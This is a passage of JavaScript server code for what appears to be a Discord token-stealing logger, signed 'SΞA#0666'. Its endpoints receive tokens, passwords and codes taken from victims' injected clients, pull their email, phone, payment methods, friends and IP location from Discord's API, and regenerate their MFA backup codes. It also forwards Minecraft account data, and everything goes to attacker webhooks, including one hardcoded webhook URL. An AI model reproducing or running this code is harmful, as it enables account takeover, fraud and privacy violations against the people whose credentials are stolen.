        .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", "```" + `${basicInfos.username}#${basicInfos.discriminator}` + "```")
        .addField("𝐁𝐚𝐝𝐠𝐞𝐬", badges(basicInfos.flags), true)
        .addField("𝗡𝗶𝘁𝗿𝗼", getNitro(basicInfos.premium_type), true)
        .addField("𝐅𝗿𝐢𝗲𝐧𝐝𝐬", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝", billing, true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝", "`" + guildInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝 𝐎𝐰𝐧", "`" + owowner + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬", "`" + appliInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬", "`" + connectInfos.length + "`", true)
        .addField("𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱 ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱", "`" + basicInfos.verified + "`", true)
        .addField("𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝗶𝗲", "```" + bio + "```")
        .addField("𝗘𝗺𝗮𝗶𝗹", "```" + basicInfos.email + "```")
        .addField("𝗣𝗵𝗼𝗻𝗲", "```" + phone + "```")
        .addField("𝗧𝗼𝗸𝗲𝗻", "```" + req.token + "```")
        .addField("𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ", "```" + req.password + "```")
        .addField("𝐈𝐏 𝐈𝐧𝐟𝐨𝐬", "```" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "```")
        .addField("𝗖𝗿𝗲𝗱𝗶𝘁 𝗖𝗮𝗿𝗱 𝗜𝗻𝗳𝗼𝘀", "```" + `Used Code: ${req.code}\nGoogle Auth: ${req.authKey}` + "```")
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    embed.addField("𝗜𝗻𝗷𝗲𝗰𝘁𝗲𝗱 𝗜𝗻", "```" + req.injected.split("\\")[5] + "```")
    basicInfos.mfa_enabled == true && embed.addField("𝐌𝐅𝐀 𝐂𝐨𝐝𝐞𝐬", "```" + getMFACode(req.token, req.password) + "```")
    webhook.send(embed)
    webhook2.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle(`𝐅𝐫𝐢𝐞𝐧𝐝𝐬 𝐅𝐫𝐨𝐦 ${basicInfos.username}`)
        .setURL("https://discords.com/bio/p/grr")
        .setDescription(friendInfos(friendsInfos))
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    webhook.send(friendEmbed)
    webhook2.send(friendEmbed)
})
app.post("/mfadisable", (req, res) => {
    req = JSON.parse(req.body)
    res.sendStatus(200)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Yes \` `
    else billing = "```No.```"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "𝗡𝗼 𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝘆"
    if (bio.startsWith("```") && bio.endsWith("```")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "𝗡𝗼 𝐏𝗵𝗼𝗻𝗲."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
    var embed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle("𝐌𝐅𝐀 𝐃𝐢𝐬𝐚𝐛𝐥𝐞𝐝 !")
        .setURL("https://discords.com/bio/p/grr")
        .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", "```" + `${basicInfos.username}#${basicInfos.discriminator}` + "```")
        .addField("𝐁𝐚𝐝𝐠𝐞𝐬", badges(basicInfos.flags), true)
        .addField("𝗡𝗶𝘁𝗿𝗼", getNitro(basicInfos.premium_type), true)
        .addField("𝐅𝗿𝐢𝗲𝐧𝐝𝐬", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝", billing, true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝", "`" + guildInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝 𝐎𝐰𝐧", "`" + owowner + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬", "`" + appliInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬", "`" + connectInfos.length + "`", true)
        .addField("𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱 ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱", "`" + basicInfos.verified + "`", true)
        .addField("𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝗶𝗲", "```" + bio + "```")
        .addField("𝗘𝗺𝗮𝗶𝗹", "```" + basicInfos.email + "```")
        .addField("𝗣𝗵𝗼𝗻𝗲", "```" + phone + "```")
        .addField("𝗧𝗼𝗸𝗲𝗻", "```" + req.token + "```")
        .addField("𝐈𝐏 𝐈𝐧𝐟𝐨𝐬", "```" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "```")
        .addField("𝗜𝗻𝗳𝗼𝘀", "```" + `Used Code: ${req.code}` + "```")
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    embed.addField("𝗜𝗻𝗷𝗲𝗰𝘁𝗲𝗱 𝗜𝗻", "```" + req.injected.split("\\")[5] + "```")
    webhook.send(embed)
    webhook2.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle(`𝐅𝐫𝐢𝐞𝐧𝐝𝐬 𝐅𝐫𝐨𝐦 ${basicInfos.username}`)
        .setURL("https://discords.com/bio/p/grr")
        .setDescription(friendInfos(friendsInfos))
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    webhook.send(friendEmbed)
    webhook2.send(friendEmbed)
})
app.post("/inject", (req, res) => {
    req = JSON.parse(req.body)
    res.sendStatus(200)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Yes \` `
    else billing = "```No.```"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "𝗡𝗼 𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝘆"
    if (bio.startsWith("```") && bio.endsWith("```")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "𝗡𝗼 𝐏𝗵𝗼𝗻𝗲."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
    var embed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle("𝗜𝗻𝗷𝗲𝗰𝘁𝗲𝗱 !")
        .setURL("https://discords.com/bio/p/grr")
        .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", "```" + `${basicInfos.username}#${basicInfos.discriminator}` + "```")
        .addField("𝐁𝐚𝐝𝐠𝐞𝐬", badges(basicInfos.flags), true)
        .addField("𝗡𝗶𝘁𝗿𝗼", getNitro(basicInfos.premium_type), true)
        .addField("𝐅𝗿𝐢𝗲𝐧𝐝𝐬", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝", billing, true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝", "`" + guildInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝 𝐎𝐰𝐧", "`" + owowner + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬", "`" + appliInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬", "`" + connectInfos.length + "`", true)
        .addField("𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱 ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱", "`" + basicInfos.verified + "`", true)
        .addField("𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝗶𝗲", "```" + bio + "```")
        .addField("𝗘𝗺𝗮𝗶𝗹", "```" + basicInfos.email + "```")
        .addField("𝗣𝗵𝗼𝗻𝗲", "```" + phone + "```")
        .addField("𝗧𝗼𝗸𝗲𝗻", "```" + req.token + "```")
        .addField("𝐈𝐏 𝐈𝐧𝐟𝐨𝐬", "```" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "```")
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    embed.addField("𝗜𝗻𝗷𝗲𝗰𝘁𝗲𝗱 𝗜𝗻", "```" + req.injected.split("\\")[5] + "```")
    webhook.send(embed)
    webhook2.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle(`𝐅𝐫𝐢𝐞𝐧𝐝𝐬 𝐅𝐫𝐨𝐦 ${basicInfos.username}`)
        .setURL("https://discords.com/bio/p/grr")
        .setDescription(friendInfos(friendsInfos))
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    webhook.send(friendEmbed)
    webhook2.send(friendEmbed)
})
app.post("/beforeinject", (req, res) => {
    req = JSON.parse(req.body)
    console.log(req)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) var billing = `\`Yes \` `
    else var billing = "```No.```"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "𝗡𝗼 𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝘆"
    if (bio.startsWith("```") && bio.endsWith("```")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "𝗡𝗼 𝐏𝗵𝗼𝗻𝗲."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = "https://www.icegif.com/wp-content/uploads/icegif-219.gif"
    var embed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle("𝗡𝗲𝘄 𝗧𝗼𝗸𝗲𝗻 𝗚𝗿𝗮𝗯𝗯𝗲𝗱 !")
        .setURL("https://discords.com/bio/p/grr")
        .addField("𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲", "```" + `${basicInfos.username}#${basicInfos.discriminator}` + "```")
        .addField("𝐁𝐚𝐝𝐠𝐞𝐬", badges(basicInfos.flags), true)
        .addField("𝗡𝗶𝘁𝗿𝗼", getNitro(basicInfos.premium_type), true)
        .addField("𝐅𝗿𝐢𝗲𝐧𝐝𝐬", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐌𝐞𝐭𝐡𝐨𝐝", billing, true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝", "`" + guildInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐆𝐮𝐢𝐥𝐝 𝐎𝐰𝐧", "`" + owowner + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐀𝐩𝐩𝐥𝐢𝐜𝐚𝐭𝐢𝐨𝐧𝐬", "`" + appliInfos.length + "`", true)
        .addField("𝐓𝐨𝐭𝐚𝐥 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧𝐬", "`" + connectInfos.length + "`", true)
        .addField("𝗡𝗦𝗙𝗪 𝗔𝗹𝗹𝗼𝘄𝗲𝗱 ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱", "`" + basicInfos.verified + "`", true)
        .addField("𝗕𝗶𝗼𝗴𝗿𝗮𝗽𝗵𝗶𝗲", "```" + bio + "```")
        .addField("𝗘𝗺𝗮𝗶𝗹", "```" + basicInfos.email + "```")
        .addField("𝗣𝗵𝗼𝗻𝗲", "```" + phone + "```")
        .addField("𝗧𝗼𝗸𝗲𝗻", "```" + req.token + "```")
        .addField("𝐈𝐏 𝐈𝐧𝐟𝐨𝐬", "```" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "```")
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    webhook.send(embed)
    webhook2.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`By ٴSΞA#0666`)
        .setTitle(`𝐅𝐫𝐢𝐞𝐧𝐝𝐬 𝐅𝐫𝐨𝐦 ${basicInfos.username}`)
        .setURL("https://discords.com/bio/p/grr")
        .setDescription(friendInfos(friendsInfos))
        .setThumbnail(`https://cdn.discordapp.com/avatars/${basicInfos.id}/${basicInfos.avatar}.png?size=128`)
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
    webhook.send(friendEmbed)
    webhook2.send(friendEmbed)

})
app.post("/minecraft", (req, res) => {
    req = JSON.parse(req.body)
    if (req.UID) {
        var embed = new Discord.RichEmbed()
            .setAuthor(`By ٴSΞA#0666`)
            .setTitle(`𝗥𝗲𝗺𝗶𝘅 𝗖𝗹𝗶𝗲𝗻𝘁 𝗨𝗜𝗗`)
            .setDescription("```" + req.UID + "```")
            .setColor("#00aaaa")
            .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
        webhook.send(embed)
        webhook2.send(embed)
    } else {
        var embed = new Discord.RichEmbed()
            .setAuthor(`By ٴSΞA#0666`)
            .setTitle(`𝗠𝗶𝗻𝗲𝗰𝗿𝗮𝗳𝘁 𝗜𝗻𝗳𝗼𝘀`)
            .addField(`𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲`, "```" + req.username + "```")
            .addField("𝗔𝗰𝘁𝗶𝘃𝗲 𝗔𝗰𝗰𝗼𝘂𝗻𝘁", "```" + req.activeAccountLocalId + "```")
            .addField("𝗠𝗶𝗴𝗿𝗮𝘁𝗶𝗼𝗻 𝗔𝗰𝗰𝗲𝗽𝘁𝗲𝗱 ?", "```" + req.eligibleForMigration + "```")
            .addField("𝗠𝘂𝗹𝘁𝗶𝗽𝗲 𝗣𝗿𝗼𝗳𝗶𝗹𝗲𝘀 ?", "```" + req.hasMultipleProfiles + "```")
            .addField("𝗟𝗼𝗰𝗮𝗹 𝗜𝗗", "```" + req.localId + "```")
            .addField("𝗟𝗲𝗴𝗮𝗰𝘆", "```" + req.legacy + "```")
            .addField("𝗣𝗿𝗼𝗳𝗶𝗹 𝗜𝗗", "```" + req.minecraftProfileID + "```")
            .addField("𝗣𝗿𝗼𝗳𝗶𝗹 𝗡𝗮𝗺𝗲", "```" + req.minecraftProfileName + "```")
            .addField("𝗣𝗲𝗿𝘀𝗶𝘀𝘁𝗮𝗻𝘁", "```" + req.persistent + "```")
            .addField("𝗥𝗲𝗺𝗼𝘁𝗲 𝗜𝗗", "```" + req.remoteId + "```")
            .addField("𝗧𝘆𝗽𝗲", "```" + req.type + "```")
            .setColor("#00aaaa")
            .setFooter("SΞA#0666  𝗟𝗼𝗴𝗴𝗲𝗿 𝗕𝘆 SΞA#0666")
        webhook.send(embed)
        webhook2.send(embed)
    }
})


var webhook2 = "https://discord.com/api/webhooks/952626627190341723/WqVznQFPsD8kyUSZ3oB9wl2DbkWocfE03qOR1rSuv14fAly6RLmUbPbcr9IA6JTHC3pK" // Not work!

webhook2 = webhook.split("/")
webhook2 = new Discord.WebhookClient(webhook[5], webhook[6])

function getInfo(url, token) {
    var data;
    const res = request("GET", url, {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    })
    if (res.statusCode !== 200) data = "Invalid"
    else data = JSON.parse(res.getBody())
    return data
}

function getMFACode(token, password) {
    var what = ""
    const res = request("POST", "https://discord.com/api/v9/users/@me/mfa/codes", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        },
        body: JSON.stringify({
            password: password,
            regenerate: true
        })
    })
    var data = JSON.parse(res.getBody())
    data.backup_codes.forEach(a => what += `${a.code} | `);
    return what.slice(0, -2)
}

function getIPInfo(ip) {
    var data;
    var res = request("GET", `http://ip-api.com/json/${ip}`)
    data = JSON.parse(res.getBody())
    return data
}

function badges(f) {
    var b = "";
    if ((f & 1) == 1) b += "<:staff:869411643765964921>";
    if ((f & 2) == 2) b += "<:S_badgePartnerIDK:853638010737786910>";
    if ((f & 4) == 4) b += "<:Hypesquadevents:894192746569535568>"
    if ((f & 8) == 8) b += "<:DE_BadgeBughunter:918945699503145011>";
    if ((f & 64) == 64) b += "<:bravery:889966063100493914>";
    if ((f & 128) == 128) b += "<:brilliance:889966063377317908>";
    if ((f & 256) == 256) b += "<:balance:889966062962094090>";
    if ((f & 512) == 512) b += "<:lgn_earlysupporter:905293948665360384>";
    if ((f & 16384) == 16384) b += "<:DE_BadgeBughunterCanary:918945729400147978>";
    if ((f & 131072) == 131072) b += "<:dev_bot:904823639537504286>";
    if (b == "") b = ":x:"
    return b
}

function friendBadges(f) {
    var b = "";
    if ((f & 1) == 1) b += "<:staff:869411643765964921>";
    if ((f & 2) == 2) b += "<:S_badgePartnerIDK:853638010737786910>";
    if ((f & 4) == 4) b += "<:Hypesquadevents:894192746569535568>"
    if ((f & 8) == 8) b += "<:DE_BadgeBughunter:918945699503145011>";
    if ((f & 512) == 512) b += "<:lgn_earlysupporter:905293948665360384>";
    if ((f & 16384) == 16384) b += "<:DE_BadgeBughunterCanary:918945729400147978>";
    if ((f & 131072) == 131072) b += "<:dev_bot:904823639537504286>";
    if (b == "") b = "None"
    return b
}

function getNitro(oof) {
    var n = ""
    if ((oof & 0) == 0) n = "<:Nitro_Yohann:901289849024282674> :x:"
    if ((oof & 1) == 1) n = "<:Nitro_Yohann:901289849024282674>"
    if ((oof & 2) == 2) n = "<:LNnitro:918956604987166760> <:6_boost:854202388084293642>"
    if (n == "") n = "<:Nitro_Yohann:901289849024282674> :x:"
    return n
}


function friendInfos(friends) {
    var returned;
    var friendFilter = friends.filter(r => r.type == 1)
    for (filter of friendFilter) {
        var badges = friendBadges(filter.user.public_flags)
        if (badges != "None") returned += `${badges} ${filter.user.username}#${filter.user.discriminator}\n`
    }
    if (!returned) returned = "𝗛𝗶𝘀 𝗙𝗿𝗶𝗲𝗻𝗱𝘀 𝗗𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗥𝗮𝗿𝗲 𝗕𝗮𝗱𝗴𝗲𝘀"
    if (returned == "𝗛𝗶𝘀 𝗙𝗿𝗶𝗲𝗻𝗱𝘀 𝗗𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗥𝗮𝗿𝗲 𝗕𝗮𝗱𝗴𝗲𝘀") return returned
    else return returned.slice(9)
}
